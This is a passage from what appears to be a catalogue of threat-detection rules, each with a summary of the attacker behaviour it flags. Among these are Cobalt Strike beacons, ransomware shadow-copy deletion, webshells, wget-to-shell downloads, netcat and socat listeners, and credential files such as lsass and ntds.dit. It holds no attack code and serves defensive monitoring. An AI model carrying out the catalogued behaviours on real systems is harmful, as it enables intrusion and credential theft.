    can be exploited by malicious actors to execute harmful code. The detection focuses
    on changes to registry paths involving trusted documents trust records. It is
    important to note that this rule may generate alerts for legitimate macro usage,
    necessitating further tuning.
  Updated-Date: '2024_09_04'
295c9289-acee-4503-a571-8eacaef36b28:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 273b73482d58a7143ec9518b1c6609e1
  Ruleset: core
  Summary: This rule detects the load of the HackSys Extreme Vulnerable Driver (HEVD),
    which is an intentionally vulnerable Windows driver created for educational purposes
    to help security enthusiasts learn and improve their kernel-level exploitation
    skills. The driver is often exploited by malicious actors. The detection focuses
    on specific indicators such as the driver file name "HEVD.sys" and known hashes
    associated with its different versions.
  Updated-Date: '2024_09_03'
2975af79-28c4-4d2f-a951-9095f229df29:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e0a4afd92487de8d446148ac1f321025
  Ruleset: core
  Summary: This rule detects suspicious DNS queries indicative of Cobalt Strike beacons,
    which are tools used for command-and-control functions often associated with cyberattacks.
    Specifically, it identifies DNS queries that start with 'aaa.stage.' or 'post.1',
    or queries containing '.stage.123456.' These patterns are recognized as characteristics
    of Cobalt Strike's communication techniques.
  Updated-Date: '2024_09_03'
297ae038-edc2-4b2e-bb3e-7c5fc94dd5c7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2ce971c8462fe202b2f9872e35271573
  Ruleset: core
  Summary: This rule detects an executable that is not an internet browser or known
    application initiating network connections to legitimate, popular websites previously
    identified as used in attacks for dead drop resolvers. These websites include
    platforms like Facebook, YouTube, Dropbox, and others, where attackers aim to
    avoid detection by blending in with normal traffic. The rule includes several
    filters to exclude common web browsers and known safe applications to reduce false
    positives.
  Updated-Date: '2024_09_03'
2992ac4d-31e9-4325-99f2-b18a73221bb2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4831bf561dfc712964a68bd768c49ab5
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "esxcli" command with the "vm" and
    "kill" flags, which are used to kill or shutdown a specific virtual machine on
    ESXi servers. The presence of this command is often associated with administrative
    tasks; however, its detection is crucial as it could also indicate malicious activities
    targeting ESXi hosts, referencing incidents of ransomware and other cyber threats
    aimed at these environments.
  Updated-Date: '2024_09_04'
29f171d7-aa47-42c7-9c7b-3c87938164d9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2109ec37e47e795004fc1729187f94ae
  Ruleset: core
  Summary: This rule detects DNS queries for the domain 'anonfiles.com' through the
    DNS Client service on Windows systems. The domain 'anonfiles.com' is associated
    with an anonymous file upload platform frequently leveraged for malicious activities,
    including data exfiltration. Monitoring these DNS queries can help identify potential
    security threats related to unauthorized data transfers.
  Updated-Date: '2024_09_03'
29fd07fc-9cfd-4331-b7fd-cc18dfa21052:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b5d31fbc3457149c5424fcea927c8d38
  Ruleset: emerging-threats
  Summary: This rule detects potential Maze ransomware activity by identifying specific
    process characteristics indicative of its word document droppers. The detection
    focuses on the presence of temporary files executed by Microsoft Word (WINWORD.exe),
    the execution of the Windows Management Instrumentation Command-line (wmic.exe)
    from temporary directories, and command-line patterns associated with deleting
    shadow copies. These indicators are consistent with tactics and procedures used
    by Maze ransomware, which employs such methods to encrypt files and delete backup
    copies to prevent recovery.
  Updated-Date: '2024_09_03'
2a4b3e61-9d22-4e4a-b60f-6e8f0cde6f25:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 31eea803dbafb64c31b99552e763d426
  Ruleset: core
  Summary: This rule detects potential abuse of the provisioning registry key for
    indirect command execution through "Provlaunch.exe," a tool used in Windows environments.
    The provisioning registry key can be manipulated to execute arbitrary commands,
    which is a method often used to bypass traditional security mechanisms and achieve
    defense evasion.
  Updated-Date: '2024_09_03'
2a7d64cf-81fa-4daf-ab1b-ab80b789c067:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2aa1dea82f4fe91a5849245de79a1062
  Ruleset: sigmahq
  Summary: This rule detects when a configuration within Azure Firewall is modified
    or deleted. Specifically, it monitors operations related to writing or deleting
    rule collection groups and rule groups within firewall policies. These changes
    may indicate an impact on firewall settings and should be verified to determine
    if they were performed by authorized users. Unfamiliar modifications or deletions
    warrant further investigation for potential security implications.
  Updated-Date: '2024_09_04'
2a926e6a-4b81-4011-8a96-e36cc8c04302:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4965a7576740099b3bfc167655941b8c
  Ruleset: core
  Summary: This rule detects the installation of PowerShell scripts as services on
    Windows systems. It identifies events where PowerShell or its variations, such
    as 'pwsh,' are used as the service file name. This behavior is significant as
    it may indicate malicious activity, leveraging PowerShell to persist on the system.
    The rule is particularly useful for identifying potential abuse of PowerShell
    in executing unauthorized actions.
  Updated-Date: '2024_09_03'
2aa0a6b4-a865-495b-ab51-c28249537b75:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0be2ab23fb0b5dcd1f4be3b56528cc82
  Ruleset: sigmahq
  Summary: This rule detects the creation of files in the Windows startup directory,
    which could indicate an attempt to establish persistence on the system. Specifically,
    it monitors file events where the target filename contains the path '\Microsoft\Windows\Start
    Menu\Programs\StartUp'. Certain legitimate applications, such as the Windows Update
    client (wuauclt.exe), and files beginning with 'C:\$WINDOWS.~BT\NewOS\' are excluded
    from this detection to reduce false positives. While the presence of new files
    in this location should be reviewed to verify legitimacy, their occurrence might
    also result from benign activities like applications creating shortcuts.
  Updated-Date: '2024_09_04'
2aa1440c-9ae9-4d92-84a7-a9e5f5e31695:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 449b2907c8cea3702a1b429161bf6a54
  Ruleset: core
  Summary: "This rule detects suspicious shell commands commonly used in various exploit\
    \ codes, particularly those associated with malware and Apache Struts in-the-wild\
    \ and Metasploit framework exploits. The identified commands include those involving\
    \ the use of `wget` for downloading files followed by execution through `perl`,\
    \ `sh`, or `bash`, the use of Python\u2019s SimpleHTTPServer module, spawn operations\
    \ with `pty`, and various `socat` command executions. It alerts on behaviors such\
    \ as changing file permissions with `chmod`, manipulating temporary directories,\
    \ stopping firewall services, and executing known malware-related commands. The\
    \ presence of base64 decoding, unauthorized file copying, and network listening\
    \ using `nc` (netcat) are also monitored as indicators of potential exploit activities."
  Updated-Date: '2024_09_03'
2afafd61-6aae-4df4-baed-139fa1f4c345:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 801e369642bb4c006297660644727146
  Ruleset: sigmahq
  Summary: This rule detects the execution of the Active Directory diagnostic tool,
    `ntdsutil.exe`, which is commonly used for various types of attacks against the
    NTDS database (NTDS.DIT).
  Updated-Date: '2024_09_04'
2b140a5c-dc02-4bb8-b6b1-8bdb45714cde:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 05c895d34a5047c79cd68c15256fd49d
  Ruleset: sigmahq
  Summary: This rule detects image load events of system control panel items (files
    with the .cpl extension) from uncommon or non-system directories. The presence
    of such events might indicate sideloading, a method attackers use for defense
    evasion by tricking legitimate processes into loading malicious files. The rule
    focuses on .cpl files typically associated with system utilities, like hdwwiz.cpl
    and appwiz.cpl, that are generally located in trusted system directories such
    as \Windows\System32\, \Windows\SysWOW64\, and \Windows\WinSxS\. Detection of
    these files outside their usual directories can be a sign of potential malicious
    activity.
  Updated-Date: '2024_09_04'
2b1ee7e4-89b6-4739-b7bb-b811b6607e5e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b830d88425ffcb004f497fa5fc8d07c0
  Ruleset: core
  Summary: This rule detects downloads from PwnDrp web servers, which are developed
    for red team testing but are also likely to be utilized for criminal activities.
  Updated-Date: '2024_09_03'
2b30fa36-3a18-402f-a22d-bf4ce2189f35:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3d8ae2b1028b8fe9fc1fc44669ec2164
  Ruleset: emerging-threats
  Summary: This rule detects potential signs of Baby Shark malware activity by monitoring
    specific command-line patterns in Windows process creation logs. It looks for
    executions involving `powershell.exe` and `mshta.exe` accessing URLs, the presence
    of `.hta` files, registry queries related to Terminal Server Client settings,
    efforts to terminate command line processes (`cmd.exe`), and PowerShell commands
    that upload files via the System.Net.WebClient class. Baby Shark is a malware
    that targets sectors related to national security, using these behaviors to execute,
    evade defenses, and discover information on the infected systems.
  Updated-Date: '2024_09_03'
2b669496-d215-47d8-bd9a-f4a45bf07cda:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c437bafe0fe9d78afd281a3473b93ec0
  Ruleset: sigmahq
  Summary: This rule detects when Microsoft Cloud App Security identifies that a user
    or IP address is using an unsanctioned application to perform actions that indicate
    an attempt to exfiltrate information from an organization. This monitoring is
    focused on activities reported through the Security Compliance Center with a successful
    status.
  Updated-Date: '2024_09_04'
2b7d6fc0-71ac-4cf7-8ed1-b5788ee5257a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6490f2d0b560ceebcee7090e4677ce60
  Ruleset: sigmahq
  Summary: This rule detects user account lockouts resulting from multiple unsuccessful
    sign-in attempts due to incorrect user ID or password inputs on Microsoft Azure.
  Updated-Date: '2024_09_04'
2bd63d53-84d4-4210-80ff-bf0658f1bf78:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bd4d9f8d3b31306f77f6ce8825b752be
  Ruleset: emerging-threats
  Summary: This rule detects the presence of the Pingback backdoor, which is known
    to create an ICMP tunnel for communication with a command-and-control (C2) server.
    Specifically, it identifies instances where the 'updata.exe' executable is used
    to create or modify the 'oci.dll' file in the Windows directory. This activity
    correlates with behaviors described in detailed cybersecurity analyses by Trustwave,
    where such methods are employed for persistent and covert network communication.
  Updated-Date: '2024_09_03'
2bd8e100-5b3b-4b6a-bbb5-b129d3ddddc5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 91ec1153940f67061c68bdf6ec595fd8
  Ruleset: emerging-threats
  Summary: This rule detects the execution of RunDLL32.exe running a single digit
    DLL named "1.dll" using the export function "DllRegisterServer". Such behavior
    is commonly associated with malware, particularly the IcedID malware, which often
    employs this technique.
  Updated-Date: '2024_09_03'
2bfc1373-0220-4fbd-8b10-33ddafd2a142:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 157ceb25d8564e5301c19875df85744a
  Ruleset: emerging-threats
  Summary: This rule detects the creation, update, or deletion of scheduled tasks
    with names known to be used by SVR for the deployment of the GraphicalProton backdoor.
    The specific Windows Task Scheduler events monitored are Event IDs 129, 140, and
    141. The targeted task names include variants associated with system defenses
    (e.g., '\Microsoft\Windows\DefenderUPDService'), application experience, data
    integrity scans, and other Windows services. This detection requires the "Microsoft-Windows-TaskScheduler/Operational"
    log to be enabled.
  Updated-Date: '2024_09_03'
2c03648b-e081-41a5-b9fb-7d854a915091:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: eace3f8dcd203be2c767ccb44ed598ef
  Ruleset: sigmahq
  Summary: This rule detects the use of rclone, a command-line program utilized to
    manage files on cloud storage services, by identifying its default user-agent
    string through proxy logs.
  Updated-Date: '2024_09_04'
2c1486f5-02e8-4f86-9099-b97f2da4ed77:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5675f7f341d5438309d0ac78c4966ea8
  Ruleset: sigmahq
  Summary: This rule detects the execution of "curl.exe" with the "insecure" flag
    when it is used over a proxy or DNS-over-HTTPS (DOH) connection on a Windows system.
    It identifies processes that match the specific image or original filename of
    "curl.exe" and checks for command-line parameters indicating insecure connections,
    such as '--doh-insecure' or '--proxy-insecure'. This may indicate potential misuse
    or vulnerability concerning network communications executed with these flags.
  Updated-Date: '2024_09_04'
2c28c248-7f50-417a-9186-a85b223010ee:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c48a78b4afc38c2cd1add9d3cea2aead
  Ruleset: sigmahq
  Summary: This rule detects the presence of the keywords "Wscript", "Shell", and
    "Run" in the command line on Windows systems, which could indicate suspicious
    activities such as the execution of scripts designed to perform malicious actions.
    This detection aims to identify potential misuse of Windows Script Host (WSH)
    where `.Shell` and `.Run` methods are commonly used for executing commands, often
    seen in various forms of malware, including ModernLoader which delivers multiple
    stealers, cryptominers, and remote access tools (RATs).
  Updated-Date: '2024_09_04'
2c32b543-1058-4808-91c6-5b31b8bed6c5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2027d2e9cfa7097ec6dd8009c7fb9f3f
  Ruleset: core
  Summary: This rule detects Crassus, a Windows privilege escalation discovery tool,
    by identifying specific Portable Executable (PE) metadata characteristics associated
    with Crassus.exe, such as the image path, original filename, and description containing
    'Crassus'.
  Updated-Date: '2024_09_03'
2c4523d5-d481-4ed0-8ec3-7fbf0cb41a75:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 63e9834f1f9bc29e1abe42810bd03580
  Ruleset: core
  Summary: This rule detects the loading of a driver from a temporary directory on
    Windows systems. Monitoring this activity is important as it can be indicative
    of persistence or privilege escalation techniques used by adversaries. The rule
    examines loaded images for paths containing '\Temp\' to identify such events.
    While it is a critical indicator, there may be legitimate applications that trigger
    this rule, which should be reviewed to reduce false positives.
  Updated-Date: '2024_09_03'
2c6bea3a-ef58-4f2e-a775-4928f6b7c58a:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 406ab847bcc4f7b8cd1fccdc1bac62b0
  Ruleset: emerging-threats
  Summary: This rule detects the initial execution of the Raspberry Robin malware
    from an external drive using "Cmd.EXE". The detection is triggered by specific
    patterns such as the command line parameters and file extensions associated with
    the parent process, and the execution of "msiexec.exe" with certain command line
    options. Additionally, it monitors for command lines containing HTTP or HTTPS
    links indicative of potential malicious activity.
  Updated-Date: '2024_09_03'
2c95fa8a-8b8d-4787-afce-7117ceb8e3da:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0b5c5c6b965da3ee357b6ef5b1c55320
  Ruleset: sigmahq
  Summary: This rule detects the disabling of Time Machine, Apple's automated backup
    utility, via the native macOS backup utility "tmutil." This activity could be
    performed by an attacker to prevent backups from occurring, thereby disrupting
    the backup and recovery process on a macOS system.
  Updated-Date: '2024_09_04'
2c99737c-585d-4431-b61a-c911d86ff32f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e2ca15913e320bb6466ee01b1c1987ce
  Ruleset: core
  Summary: This rule detects the use of the Powerview\Add-DomainObjectAcl DCSync Extended
    Right cmdlet to backdoor a domain object, granting a regular user or machine account
    the rights associated with DCSync. This capability allows the actor to re-obtain
    the password hashes of any user or computer within the domain. It monitors event
    ID 5136 for changes to the 'ntSecurityDescriptor' attribute, specifically looking
    for certain attribute values that indicate the assignment of DCSync rights. The
    rule includes filtering to exclude DNS-related objects to reduce false positives.
  Updated-Date: '2024_09_03'
2cf29f11-e356-4f61-98c0-1bdb9393d6da:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6406c95a20be63177bdd31aed81bd33d
  Ruleset: core
  Summary: This rule detects the execution of a renamed Visual Studio Code tunnel,
    which attackers might use to establish a command and control (C2) channel. By
    monitoring specific patterns in the command line arguments, such as those ending
    with `.exe tunnel` and containing parameters like `--name`, `--accept-server-license-terms`,
    and various service-related terms, the rule identifies potentially malicious tunnel
    executions. It also considers the parent process details to pinpoint instances
    where the command line arguments match specific criteria while originating from
    'cmd.exe'. Filters are applied to exclude legitimate instances from applications
    like `code.exe` and `code-tunnel.exe`.
  Updated-Date: '2024_09_03'
2d1b83e4-17c6-4896-a37b-29140b40a788:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3ebb97d83f2d92869448a6ce096d992c
  Ruleset: sigmahq
  Summary: This rule detects when a Google Workspace user is granted admin privileges.
    It identifies specific events where either delegated admin privileges or full
    admin privileges are assigned to a user within Google Workspace. The data source
    for detection is the administrative service of Google Workspace, monitoring for
    relevant events related to the assignment of these elevated permissions.
  Updated-Date: '2024_09_04'
2d22a514-e024-4428-9dba-41505bd63a5b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a1f8a35f277f5acb5434092e0433379a
  Ruleset: sigmahq
  Summary: This rule detects the execution of the Microsoft bash launcher (`bash.exe`)
    without any accompanying flags, which can indicate attempts to run the content
    of a bash script directly. This method might be used to bypass security defenses
    and execute Linux or Windows-based binaries through the bash shell.
  Updated-Date: '2024_09_04'
2d2f44ff-4611-4778-a8fc-323a0e9850cc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a5e52b14a60f40338f784c0ff86c2149
  Ruleset: sigmahq
  Summary: This rule detects the execution of inline Python code that uses the "-c"
    option to call the "system" function from the "os" library, which then spawns
    a shell. It specifically monitors process creation events on Linux systems where
    the command line includes certain Python executable paths and shell invocations,
    such as '/bin/bash', '/bin/sh', and others.
  Updated-Date: '2024_09_04'
2d32dd6f-3196-4093-b9eb-1ad8ab088ca5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ce0c472b098aa2695b5ec1f645c294f3
  Ruleset: sigmahq
  Summary: This rule detects the execution of the `odbcconf.exe` utility with the
    `-f` flag, which indicates the loading of a response file. The rule specifically
    identifies when `odbcconf.exe` is used to load a response file with an extension
    other than ".rsp". This activity can be suspicious as it might indicate attempts
    to evade defenses or execute arbitrary code, possibly related to malicious activities
    such as backdoor installation or other unauthorized operations. The detection
    is concerned with process creation logs on Windows systems.
  Updated-Date: '2024_09_04'
2d367498-5112-4ae5-a06a-96e7bc33a211:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2618f8cef3e2bdd34453c125b01dfadd
  Ruleset: core
  Summary: "This rule detects AnyDesk writing binary files, specifically DLL and EXE\
    \ files, to disk that are not \u201Cgcapi.dll.\u201D According to research by\
    \ RedCanary, it is highly unusual for AnyDesk to write executable files to disk\
    \ other than this legitimate DLL, which is part of the Google Chrome web browser\
    \ and used to interact with the Google Cloud API. Detecting such activity can\
    \ indicate command-and-control operations and potentially malicious behavior."
  Updated-Date: '2024_09_03'
2d3cdeec-c0db-45b4-aa86-082f7eb75701:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a5753f47ca1ef0a620ad1ee2cf2f53f3
  Ruleset: core
  Summary: This rule detects the use of the Internet Information Services (IIS) command-line
    tool, AppCmd, to list passwords. It specifically monitors for the execution of
    'appcmd.exe' with command line arguments that indicate attempts to access configuration
    files or XML data and flag strings commonly associated with password-related queries.
    This can potentially indicate attempts to dump service account passwords, which
    could be used for credential access within a Windows environment.
  Updated-Date: '2024_09_03'
2d510d8d-912b-45c5-b1df-36faa3d8c3f4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: deb2a3a67615116f1720dce047c1ec92
  Ruleset: sigmahq
  Summary: This rule detects the installation of the NetSupport Manager service on
    a target Windows system. NetSupport Manager is a remote control software used
    for monitoring and management purposes. The detection mechanism looks for a specific
    service named "Client32" being registered by the Service Control Manager and identifies
    installations where the executable path includes "\NetSupport Manager\client32.exe."
    This rule is pertinent when seeking to identify persistence mechanisms implemented
    via remote administration tools.
  Updated-Date: '2024_09_04'
2d5e7a8b-f484-4a24-945d-7f0efd52eab0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 16fa81ad4e3b1366ab5c3d3647e0139c
  Ruleset: sigmahq
  Summary: This rule detects the use of the "ioreg" command, which is utilized to
    display I/O Kit registry information on macOS. This process is often employed
    for system information discovery and can be triggered either directly or through
    scripts using bash and grep to search for specific strings. Identified behaviors
    include attempts to query details related to virtualization software, USB devices,
    and hardware components, as seen in various malware activities and legitimate
    system administration tasks. Instances of such behavior have been documented in
    relation to malware like the OceanLotus macOS backdoor.
  Updated-Date: '2024_09_04'
2d87d610-d760-45ee-a7e6-7a6f2a65de00:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 800e19996cfacdc61362da0b08c3957e
  Ruleset: emerging-threats
  Summary: "This rule detects the usage of specific process parameters typically associated\
    \ with Mustang Panda droppers on Windows systems. Mustang Panda is a China-based\
    \ advanced persistent threat (APT) group known for targeting minority groups as\
    \ well as public and private sector organizations. The detection criteria include\
    \ command lines and processes that exhibit characteristics indicative of this\
    \ malware, such as commands involving 'Temp\\wtask.exe', script execution via\
    \ 'vbscript', file operations in user directories, creation of security-related\
    \ tasks, and the utilization of 'Temp\\winwsh.exe\u2019 executables. These indicators\
    \ suggest the performance of malicious activities tied to Mustang Panda\u2019\
    s campaigns."
  Updated-Date: '2024_09_03'
2d9403d5-7927-46b7-8216-37ab7c9ec5e3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 40f53e042914cdca05f0b26765032874
  Ruleset: emerging-threats
  Summary: This rule detects any changes to the 'ms-msdt' MSProtocol URI scheme in
    the Windows Registry, which could indicate an attempt to exploit the vulnerability
    identified as CVE-2022-30190. This vulnerability pertains to the Microsoft Support
    Diagnostic Tool (MSDT), and unauthorized alterations in this part of the registry
    could signal a potential defense evasion or other malicious activity.
  Updated-Date: '2024_09_03'
2dbc10d7-a797-49a8-8776-49efa6442e60:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 05bd1cb50e73ffb4e4dd99cf5e0db49d
  Ruleset: emerging-threats
  Summary: This rule detects exploitation attempts of CVE-2019-11510 on Pulse Secure,
    indicated by URIs containing the word "Guacamole." It looks for specific query
    patterns in the webserver logs associated with this vulnerability. The detection
    focuses on identifying unusual access attempts potentially linked to malicious
    activities targeting this known security flaw. Information collected includes
    client IP, virtual host, URL, and server response, aiding in the identification
    and investigation of potential attacks. This vulnerability pertains to the Pulse
    Secure VPN appliances and their susceptibility to unauthenticated remote file
    disclosure.
  Updated-Date: '2024_09_03'
2dbd9d3d-9e27-42a8-b8df-f13825c6c3d5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bbf9c22f36c90621f878660766dd4deb
  Ruleset: sigmahq
  Summary: This rule detects the execution of "rundll32.exe" initiated by "svchost.exe"
    with specific command-line arguments involving "C:\windows\system32\davclnt.dll,DavSetCookie".
    Such activity may indicate the use of WebDav for data exfiltration or the execution
    of code hosted on a WebDav server.
  Updated-Date: '2024_09_04'
2dd2c217-bf68-437a-b57c-fe9fd01d5de8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6fed9d1f4d38b8af4a2e7a2793f43498
  Ruleset: core
  Summary: This rule detects the usage of regsvr32.exe to download and install DLLs
    from remote locations using an IP address. Regsvr32 is a legitimate Windows utility
    used to register and unregister Object Linking and Embedding (OLE) controls such
    as DLLs and ActiveX controls within the Windows operating system. However, it
    can be leveraged by attackers for defense evasion by downloading malicious DLLs
    from external servers. The detection focuses on command lines that invoke regsvr32.exe
    with parameters pointing to HTTP or HTTPS URLs starting with numbers, indicative
    of an IP address.
  Updated-Date: '2024_09_03'
2ddef153-167b-4e89-86b6-757a9e65dcac:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cc65cfb863f188fa8eda1088743aa3fd
  Ruleset: core
  Summary: This rule detects the use of bitsadmin.exe to download a file into suspicious
    target folders on a Windows system. It monitors process creation logs for any
    instances where bitsadmin is executed with specific command line flags such as
    '/transfer', '/create', or '/addfile'. The rule particularly scrutinizes downloads
    directed to potentially sensitive or unusual directories, including but not limited
    to '\Perflogs', '\ProgramData\', '\Temp\', '\Users\Public\', '\Windows\', and
    various paths within the AppData and Desktop folders. This behavior can indicate
    malicious activity related to defense evasion, persistence, or attack techniques
    enumerated under identifiers like T1197, S0190, and T1036.003.
  Updated-Date: '2024_09_03'
2e4e488a-6164-4811-9ea1-f960c7359c40:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 093445d93ab39786de6f86ce9d7f1c90
  Ruleset: core
  Summary: This rule detects remote thread creation activities initiated by CACTUSTORCH,
    a penetration testing tool. Specifically, it looks for source images like 'cscript.exe',
    'wscript.exe', 'mshta.exe', 'winword.exe', and 'excel.exe' in the 'System32' directory
    that target images containing 'SysWOW64'. This behavior is indicative of certain
    attack techniques such as defense evasion and execution, which could suggest malicious
    usage of legitimate Windows binaries to manipulate or execute code in other processes.
  Updated-Date: '2024_09_03'
2e65275c-8288-4ab4-aeb7-6274f58b6b20:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 83c4957ddad9ae736abea58775ea5295
  Ruleset: sigmahq
  Summary: This rule detects the execution of the SysInternals Procdump utility on
    Windows systems. Procdump is a command-line tool often used for monitoring applications
    for CPU spikes and generating crash dumps in such situations. Usage of procdump.exe
    or procdump64.exe is flagged, as these may be indicative of attempts to evade
    defenses or perform credential dumping. Legitimate administration or developer
    activities may also trigger this detection.
  Updated-Date: '2024_09_04'
2e669ed8-742e-4fe5-b3c4-5a59b486c2ee:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6ff4bb2c7aac2f4f38e1923be934360a
  Ruleset: sigmahq
  Summary: This rule detects when activities are reported by Microsoft Cloud App Security
    for users whose accounts were terminated in Azure AD but are still active on other
    platforms such as AWS or Salesforce. This is particularly significant for users
    managing resources with alternate accounts that are not deactivated upon their
    departure from the company.
  Updated-Date: '2024_09_04'
2e69f167-47b5-4ae7-a390-47764529eff5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 94fbc02046597f70a19eae1f6a6156d2
  Ruleset: sigmahq
  Summary: This rule detects the transfer of files containing credential data via
    network shares monitored by Zeek in SMB file activities. It identifies the movement
    of specific filenames associated with sensitive information, such as 'mimidrv',
    'lsass', 'windows/minidump', 'hiberfil', 'sqldmpr', 'sam', 'ntds.dit', and 'security'.
    This activity may indicate the unauthorized extraction of credentials from critical
    system files.
  Updated-Date: '2024_09_04'
2e7bbd54-2f26-476e-b4a1-ba5f1a012614:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3ed54343fa68e1702d0cc31c44c2200a
  Ruleset: emerging-threats
  Summary: This rule detects process creation activity associated with the Peach Sandstorm
    Advanced Persistent Threat (APT). It specifically looks for instances where the
    command line includes the string 'QP''s\*(58vaP!tF4'. Peach Sandstorm APT is known
    for its sophisticated cyber-espionage operations, and identifying related process
    activity can be critical for early detection and response to potential threats.
  Updated-Date: '2024_09_03'
2ea44a60-cfda-11ea-87d0-0242ac130003:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 231df3214314172f283788d2300b0f04
  Ruleset: core
  Summary: This rule detects potential activity of the ReGeorg webshell by monitoring
    specific patterns in web server logs. It identifies certain strings in the URI
    query field, such as 'cmd=read', 'connect&target', 'cmd=connect', 'cmd=disconnect',
    and 'cmd=forward', which are commonly associated with ReGeorg. Additionally, it
    checks for null values in both the referer and user-agent fields and ensures that
    the HTTP request method used is POST. This combination of factors helps to flag
    suspicious behavior indicative of ReGeorg webshell operations.
  Updated-Date: '2024_09_03'
2ece8816-b7a0-4d9b-b0e8-ae7ad18bc02b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 310030052990faad2e7bbe649bb4aa0f
  Ruleset: emerging-threats
  Summary: This rule detects exploitation indicators of CVE-2023-20198, a privilege
    escalation vulnerability in Cisco IOS XE Software Web UI. The detection is based
    on identifying specific log entries within Cisco system logs, which need to be
    properly configured and ingested. It searches for log events such as '%WEBUI-6-INSTALL_OPERATION_INFO:',
    '%SYS-5-CONFIG_P:', and '%SEC_LOGIN-5-WEBLOGIN_SUCCESS:' in conjunction with user
    accounts named 'cisco_tac_admin', 'cisco_support', or 'cisco_sys_manager'. This
    combination signals potential unauthorized access due to the vulnerability. Rare
    false positives could occur if there are legitimate users with these names.
  Updated-Date: '2024_09_03'
2f0bae2d-bf20-4465-be86-1311addebaa3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c1e8198dd4f628e685ba59caa7145a3e
  Ruleset: sigmahq
  Summary: This rule detects the modification or deletion of Secrets within Google
    Cloud Kubernetes environments. It monitors specific actions such as creating,
    updating, patching, or deleting Secrets through the Google Cloud Platform audit
    logs. The primary actions checked include method names indicating these operations,
    which could suggest credential access activity. It recommends verifying whether
    such activities are conducted by authorized users or if they might indicate malicious
    behavior, particularly when performed by unfamiliar users.
  Updated-Date: '2024_09_04'
2f211361-7dce-442d-b78a-c04039677378:
  Created-Date: '2024_08_07'
